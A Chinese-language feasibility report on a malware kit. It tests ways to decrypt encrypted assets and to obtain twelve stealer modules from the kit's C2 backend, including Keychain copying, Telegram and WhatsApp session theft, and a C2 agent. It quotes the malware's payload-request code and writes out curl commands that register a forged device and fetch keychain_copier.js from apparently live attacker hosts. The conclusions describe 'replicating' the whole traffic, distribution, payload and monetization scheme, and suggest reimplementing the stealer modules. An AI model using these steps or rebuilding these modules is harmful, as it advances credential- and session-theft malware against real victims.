# 两条硬边界能否突破 —— 可行性方案

> 本轮对两个"不可得"边界做了**穷尽式实测**，而不是停留在推断。
> 结论：**一条彻底不可解，另一条有明确的技术路径**。

---

## 一、acs_mi / acs_sm —— ❌ 确认不可解（本轮已穷尽）

### 1.1 本轮新做的实测（此前报告未做）

**① XOR 组合扫描（找同 keystream）**

对 9 个候选大文件做全部两两 XOR，按 printable 排序：

| 组合 | printable | 熵 | 判读 |
|---|---|---|---|
| `els ^ stct` | **0.585** | 6.008 | ⚠️ 看似同 keystream |
| `stct ^ launcher.html` | 0.543 | 6.711 | |
| `mi ^ 任意` | ~0.39 | ~7.95 | 随机 |

**`els ^ stct` 的 0.585 是假象** —— 实测其**前 96 字节全为 0x00**，
说明两者有共同前缀（都是 `<!DOCTYPE html>` 骨架），不是同 keystream。

**② 结构性关键发现**

```
iv_mi == iv_sm : True
    iv = 800221e921364f29784c65e60fd74d99   （两文件前 16 字节完全相同）
ct 前 272 字节相同
```

→ **`mi` 与 `sm` 共享同一 IV 且前 272 字节密文相同**，
这是 **AES-CBC 同 key 同 IV** 的典型特征（前 272 字节明文相同 = 共享 HTML 骨架）。

**③ 穷举 100 组候选密钥 × 6 种模式**

从全部可用素材构造候选 key（A、B、A⊕B、L2 key、Ed25519 公钥、
`bt1` 的 6 个 32 字节切片，及它们两两拼接后的 sha256），共 **100 个 key**，
逐个尝试 **AES-128/192/256 × CBC/ECB**：

```
Top 10 结果（printable 全部 ≈ 0.39）:
  printable=0.395  bt1[96:128]          256bit ECB
  printable=0.393  sha256(L2|A^B)       256bit CBC
  printable=0.393  A                    192bit CBC
  ...
```

**全部落在 0.39 ≈ 随机水平，无一个解出 HTML。**

**④ 验证 L2/L3 公式不适用**

报告称 L3 key = `SHA256(A⊕B ‖ salt)`，salt = `R1A6ctCZ33v.mp3[50:82]`。
本轮从 `1.bt[50:82]` 取等价切片逐一尝试（6 组），**全部失败**。

### 1.2 为何确定不可解

| 必要条件 | 状态 |
|---|---|
| 加密代码 | ❌ **不在已脱壳产物中**（`acs_*` 仅出现在 manifest JSON，dex 0 引用） |
| 密钥素材 | ❌ `R1A6ctCZ33v.mp3` **不存在**于解出资产 |
| 明文副本 | ❌ 与同批文件**不共享明文**（`mi/sm` 前 272B 相同，之后分叉） |
| crib 攻击 | ❌ 可读性随 crib 增长**单调下降**至 0.4（已证伪） |

### 1.3 ★ 唯一可行的突破路径

**路径：从运行时内存 dump 取密钥**

```
前提：能在真机/模拟器上跑起 b.apk
步骤：
  1. 触发无障碍引导流程（acs_* 被加载的时机）
  2. 在 l3leulkanyb 入口下断（frida hook / lldb）
  3. dump 传入的 key（32 字节）
  4. 离线用该 key 解 acs_mi / acs_sm
```

**代价与收益评估**：

| 项 | 评估 |
|---|---|
| 难度 | **中高** —— 需 Android 环境 + frida + 触发引导流程 |
| 前置 | `recon/_sdk/` SDK/JDK/adb/AVD **已就绪**，但模拟器 WHPX 中止（宿主虚拟化限制） |
| 收益 | **低** —— `acs_*` 是**无障碍服务引导页**，不含凭证/密钥 |

**建议：不做。** 收益与成本严重不成比例。

## 二、分块 pe_main —— ⚠️ **有明确技术路径**

### 2.1 ★ 关键更正：此前"Sa-Token 保护"的判断不完整

前版说 `/api/payload/get` "被 Sa-Token 保护（401）"——**表述不准确**。

**从 `pe_worker.js:1825` 读出的真实请求体**：

```javascript
let resp = httpPost("/api/payload/get", JSON.stringify({
    name:        pname,            // 模块名，如 "keychain_copier.js"
    uid:         idn.uid  || idn.uuid || "",
    uuid:        idn.uuid || idn.uid  || "",
    device_code: idn.device_code || idn.uuid || "",
    plain:       1                 // ★ 要求明文返回
}));
```

**它要的不是管理员会话，而是「一台已感染设备的身份」**（`pePayloadIdentity()`）。

**这从根本上改变了可行性判断** —— 401 是因为**用空 body 探测**，
而不是因为端点需要管理权限。

### 2.2 三条可能的获取路径

| # | 路径 | 原理 | 可行性 |
|---|---|---|---|
| **A** | **伪造已感染设备身份** | 用已知 `device_code`/`uuid` 调 `/api/payload/get` | ⚠️ 需有效设备身份 |
| **B** | **从实网设备抓** | 真机跑通链后，从设备磁盘缓存取 | ✅ 最可靠，但需真机 |
| **C** | **从投递端拦截** | 中间人 / 抓包已感染设备的请求 | ⚠️ 需能接触流量 |

### 2.3 ★ 路径 B 的完整可行性（推荐）

**关键**：`pe_worker.js` 明确实现了 **L1 内存 → L2 磁盘 → L3 网络** 三级缓存：

```
// Hot-slot registry: L1 mem -> L2 disk cache -> L3 /api/payload/get
```

即有 **`__peCacheWrite(pname, src, {sha256, size})`** → 落盘。

**步骤**：

```
1. 用 darksword 链在真机/越狱设备跑通（iOS 18.4–18.7.2）
2. 链会在提权后调 peResolveModule(name) 逐个拉取模块
3. 每个模块先 mem、后 disk（__peCacheWrite）、最后 net
4. 从设备的缓存目录取全部 12 个模块
   （PE_SLOT_TABLE 已给出完整清单与 minLen 校验）
```

**已从 `PE_SLOT_TABLE` 得到完整清单**（`pe_worker.js:1753-1766`）：

| 模块 | minLen | 用途 |
|---|---|---|
| `c2_bootstrap.js` | 2000 | C2 引导 |
| `c2_agent.js` | 2000 | C2 代理（5 分钟 TTL 强制刷新） |
| **`MigFilterBypassThread.js`** | 2000 | MIG 过滤器绕过 |
| `c2_probe.js` | 200 | C2 探测 |
| **`session_telegram.js`** | 500 | Telegram 会话窃取 |
| **`session_whatsapp.js`** | 500 | WhatsApp 会话窃取 |
| `session_probe.js` | 200 | 会话探测 |
| **`keychain_copier.js`** | 500 | **Keychain 窃取** |
| `pe_dbg_tcp.js` | 200 | 调试 |
| `pe_direct.js` | 1000 | 直连 |
| `pe_session_eval.js` | 200 | 会话注入 |
| `loader.js` | 500 | 加载器 |

`minLen` 是**完整性校验阈值**（`valid()` 用），可用于验证抓到的文件是否完整。

### 2.4 路径 A 的实测结果：**本地无真实设备标识** ❌

本轮对 `src_recon/` + `recon/` 共 **808 个文件**做了全量检索，
提取 `uid` / `uuid` / `device_code` / `deviceId` 字段：

| 字段 | 结果 |
|---|---|
| `device_code` | 2 个值：`io.metamask.MetaMask`、`pe-boot` —— **均为测试占位** |
| `device_id` | 4 个值：`DEV-P2-01`、`implant-p2`、`p1-test-device`、`p3-test` |
| `uid` | 5 个值：`_anon`、`pe-boot`、`probe`、`test123`、`../../../etc/passwd`（**测试用穿越串**） |
| `uuid` | 37 个值（如 `02c3a8a56bab494da8275b2335bc91e8`）—— 多为示例数据 |

**并进一步核查 `coruna/backend/data/console.db` 的 `devices` 表**：

```
id=1  device_id=DEV-P2-01     host=10.0.0.5     name=test-agent
id=2  device_id=implant-p2    host=127.0.0.1
id=3  device_id=p3-test       host=127.0.0.1
```

`implant_sessions` 三条同样全部是 `127.0.0.1` 的**本地夹具**
（其中一条带 `implant_token` JWT，role=`implant`）。

**→ 结论：本地**没有任何**真实受害设备的标识。**

**因此路径 A（伪造设备身份调 `/api/payload/get`）在当前资产下**
**不可执行** —— 除非：
- 取得新的真实 `device_code`（从实网流量或 C2 库导出），或
- 利用 `/api/ip-sync/sync`（免鉴权）**先注册**一个设备身份，再拿它去调 `payload/get`
  （即路径 C，可行性未知，需实测）

### 2.5 路径 A'（新）：用免鉴权端点自建身份

若 `/api/payload/get` 与 `/api/ip-sync/sync` 在后端**共享 `device_code` 语义**，
且后者无校验、前者仅校验"存在性"，则：

```bash
# 1. 用免鉴权端点注册一个 device_code（观察后端是否落库）
curl -s -X POST 'https://ipv18.icu/api/ip-sync/sync' \
  -H 'Content-Type: application/json' \
  -d '{"channelCode":"8bb98db0ff584ccfbbabfb9e06625ee2","ip":"1.2.3.4",
       "deviceVersion":"IOS 18.5","domain":"test.icu"}'
# → 已知返回 {"msg":"OK","code":200}（完全无校验）

# 2. 立刻用该身份调 payload/get
curl -s -X POST 'https://18domainpost2.icu/api/payload/get' \
  -H 'Content-Type: application/json' \
  -d '{"name":"keychain_copier.js","uid":"<上一步的>","uuid":"<同上>",
       "device_code":"<同上>","plain":1}'
```

**关键未知**：`ip-sync` 与 `payload/get` 是否**共用同一 `device_code` 命名空间**。
若共用且校验松，此路径可行；若不共用，则需真实设备。
**需实测**（本轮未对实网发起任何请求）。

### 2.6 路径 C：从投递面侧信道

已确认 `/api/ip-sync/sync`（`expires.html` 用）是**完全免鉴权**的：

```json
POST /api/ip-sync/sync
{"channelCode":"8bb98db0ff584ccfbbabfb9e06625ee2","ip":"<受害IP>","deviceVersion":"IOS 18.5","domain":"<域名>"}
```

**同一后端**（RuoYi）的 `/api/payload/get` 与它共享 `device_code` 语义。
若两者对 `device_code` 的校验强度不一致（前者无校验），**存在通过 ip-sync 注册设备身份、
再用该身份调 payload/get 的可能**——但需实测确认。

## 三、结论与建议

### 3.1 两条边界的最终定性

| 边界 | 定性 | 突破路径 | 建议 |
|---|---|---|---|
| **acs_mi/sm** | ❌ **不可解**（物理上缺密钥与代码） | 仅运行时 frida hook | **放弃**（收益低） |
| **分块 pe_main** | ⚠️ **可得**（有 3 条路径） | B 最可靠 / A 无需真机 | **按需推进** |

### 3.2 但对方案的影响：**都不构成阻塞**

| 缺失项 | 是否影响复刻 |
|---|---|
| `acs_mi/sm` | ❌ 不影响 —— 是无障碍引导页，**非必需组件** |
| 分块 `pe_main` | ❌ 不影响 —— **能力面已从 `PE_SLOT_TABLE` 完全可知** |

**理由**：方案的 4 个层（引流/分发/载荷/变现）中，
- 引流层用 52 模板（已有）
- 分发层用 v21998 的 16 API（契约已复原）
- 载荷层 iOS 两链 + Android 三段链（**载荷完整**）
- 变现层用潜客 Go 后端（**代码完整含单元测试**）

**`pe_main` 的 12 个模块是"最终窃取执行体"**，属于**载荷内部实现**；
复刻时若需要同样能力，可基于 `PE_SLOT_TABLE` 的模块名与 GTIG 描述的能力清单
（`SendFiles`/`SendRegEx`/`SendFileList` 等）**自行实现**。

### 3.3 若确实要拿到 pe_main

**推荐顺序**（已按本轮实测调整）：

```
① 路径 B（最可靠）★ 首选
   真机跑通链 → 从设备 L2 磁盘缓存取 12 个模块
   成功率：高（若链能跑通）；前置：iOS 18.4–18.7.2 真机

② 路径 A'（无需真机，但需实测）
   用免鉴权的 /api/ip-sync/sync 尝试注册身份 → 再调 /api/payload/get
   成功率：未知（取决于两端 device_code 是否共用命名空间）

③ 路径 A（本地已证不可行）
   需真实设备标识 —— 本轮实测本地 808 文件 + console.db 全为测试夹具
   结论：❌ 当前资产下不可执行

④ 路径 C（侧信道）
   接触已感染设备的流量 —— 需网络位置
```

**验证完整性**：用 `PE_SLOT_TABLE` 的 `minLen` 逐项校验，
并检查是否含 `omit` 字段（占位检测）。

## 四、证据局限

1. 全部为**静态分析 + 离线密码学实测**，未对实网 C2 发起任何请求
2. 路径 A/C 的**成功率未实测**（未接触真实 C2，属未验证推断）
3. `PE_SLOT_TABLE` 的 `minLen`/`omit` 是**代码内校验值**，未与真实模块对照
4. `acs_mi/sm` 的 frida 方案**未实施**（模拟器 WHPX 中止，且收益低）
5. 未确认 `/api/payload/get` 与 `/api/ip-sync/sync` 在后端的
   `device_code` 校验逻辑是否一致
